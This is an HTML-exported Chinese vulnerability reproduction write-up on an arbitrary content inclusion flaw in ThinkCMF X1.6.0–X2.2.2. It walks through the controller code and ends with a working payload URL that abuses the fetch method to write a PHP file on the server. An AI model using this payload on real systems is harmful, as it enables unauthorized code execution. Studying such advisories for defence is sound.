<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="thinkcmf-框架上的任意内容包含漏洞"><span class="csDE05BCC">ThinkCMF </span><span class="csECDA2D3">框架上的任意内容包含漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">ThinkCMF X1.6.0 ThinkCMF X2.1.0 ThinkCMF X2.2.0 ThinkCMF X2.2.1 ThinkCMF X2.2.2</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">根据</span><span class="cs8926E06">index.php</span><span class="cs9C1B1871">中的配置，他的项目路径为</span><span class="cs8926E06">application</span><span class="cs9C1B1871">，打开</span><span class="cs8926E06"> Portal </span><span class="cs9C1B1871">下的</span><span class="cs8926E06"> Controller </span><span class="cs9C1B1871">目录，选择一个控制类文件。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/ThinkCMF%20%e6%a1%86%e6%9e%b6%e4%b8%8a%e7%9a%84%e4%bb%bb%e6%84%8f%e5%86%85%e5%ae%b9%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="306" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">发现他的父类为</span><span class="cs8926E06">Common\Controller\HomebaseController</span><span class="cs9C1B1871">。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">在</span><span class="cs8926E06">HomeBaseController</span><span class="cs9C1B1871">中加入如下测试代码</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/ThinkCMF%20%e6%a1%86%e6%9e%b6%e4%b8%8a%e7%9a%84%e4%bb%bb%e6%84%8f%e5%86%85%e5%ae%b9%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="146" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">ThinkPHP</span><span class="cs9C1B1871">是一套基于</span><span class="cs8926E06">MVC</span><span class="cs9C1B1871">的应用程序框架，被分成三个核心部件：模型（</span><span class="cs8926E06">M</span><span class="cs9C1B1871">）、视图（</span><span class="cs8926E06">V</span><span class="cs9C1B1871">）、控制器（</span><span class="cs8926E06">C</span><span class="cs9C1B1871">）。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">由于添加的代码在控制器中，根据</span><span class="cs8926E06">ThinkPHP</span><span class="cs9C1B1871">框架约定可以通过</span><span class="cs8926E06">a</span><span class="cs9C1B1871">参数来指定对应的函数名，但是该函数的修饰符必须为</span><span class="cs8926E06">Public, </span><span class="cs9C1B1871">而添加的代码正好符合该条件。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">可以通过如下</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">进行访问，并且可以添加</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">参数</span><span class="cs8926E06">arg1</span><span class="cs9C1B1871">传递给函数。</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1/cmfx-master/?a=test_public&amp;arg1=run%20success</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/ThinkCMF%20%e6%a1%86%e6%9e%b6%e4%b8%8a%e7%9a%84%e4%bb%bb%e6%84%8f%e5%86%85%e5%ae%b9%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="107" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">HomeBaseController</span><span class="cs9C1B1871">类中有一些访问权限为</span><span class="cs8926E06">public</span><span class="cs9C1B1871">的函数，</span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/ThinkCMF%20%e6%a1%86%e6%9e%b6%e4%b8%8a%e7%9a%84%e4%bb%bb%e6%84%8f%e5%86%85%e5%ae%b9%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="476" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">重点关注</span><span class="cs8926E06">display</span><span class="cs9C1B1871">函数</span><span class="cs8926E06">.</span><span class="cs9C1B1871">看描述就是可以自定义加载模版，通过</span><span class="cs8926E06"> $this-&gt;parseTemplate </span><span class="cs9C1B1871">函数根据约定确定模版路径，如果不符合原先的约定将会从当前目录开始匹配。</span><span class="cs8926E06"> </span><span class="cs9C1B1871">然后调用</span><span class="cs8926E06">THinkphp Controller </span><span class="cs9C1B1871">函数的</span><span class="cs8926E06">display</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">/**</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * </span><span class="cs7FFD2630">加载模板和页面输出</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">可以返回输出内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @access public</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @param string $templateFile </span><span class="cs7FFD2630">模板文件名</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @param string $charset </span><span class="cs7FFD2630">模板输出字符集</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @param string $contentType </span><span class="cs7FFD2630">输出类型</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @param string $content </span><span class="cs7FFD2630">模板输出内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> * @return mixed</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> */</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">public function display($templateFile = &#39;&#39;, $charset = &#39;&#39;, $contentType = &#39;&#39;, $content = &#39;&#39;, $prefix = &#39;&#39;) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parent::display($this-&gt;parseTemplate($templateFile), $charset, $contentType,$content,$prefix);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再往下就是调用</span><span class="cs8926E06">Think View</span><span class="cs9C1B1871">的</span><span class="cs8926E06">fetch</span><span class="cs9C1B1871">方法，这里的</span><span class="cs8926E06">TMPL_ENGINE_TYPE </span><span class="cs9C1B1871">为</span><span class="cs8926E06">Think, </span><span class="cs9C1B1871">最终模版内容解析在</span><span class="cs8926E06">ParseTemplateBehavior</span><span class="cs9C1B1871">中完成</span><span class="cs8926E06"> </span><span class="cs9C1B1871">如下调用即可加载任意文件</span><span class="cs8926E06"> <a class="cs508254C" href="http://0-sec.org:81/cmfx-master/?a=display&amp;templateFile=README.md"><span class="cs4B51D5E4">http://0-sec.org:81/cmfx-master/?a=display&amp;templateFile=README.md</span></a></span></p><p class="cs40DD2BC9"><span><img src="Web安全/ThinkCMF/ThinkCMF%20%e6%a1%86%e6%9e%b6%e4%b8%8a%e7%9a%84%e4%bb%bb%e6%84%8f%e5%86%85%e5%ae%b9%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="270" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">往下面翻阅发现还有</span><span class="cs8926E06">fetch</span><span class="cs9C1B1871">方法，</span><span class="cs8926E06">display</span><span class="cs9C1B1871">方法相对</span><span class="cs8926E06">fetch</span><span class="cs9C1B1871">只是多了一个</span><span class="cs8926E06">render</span><span class="cs9C1B1871">的过程，而且这里不需要知道文件路径</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最终完美</span><span class="cs8926E06">payload</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://0-sec.org/?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,&#39;&lt;?php phpinfo(); ?&gt;&#39;)&lt;/php&gt;</span></p></body>
</html>
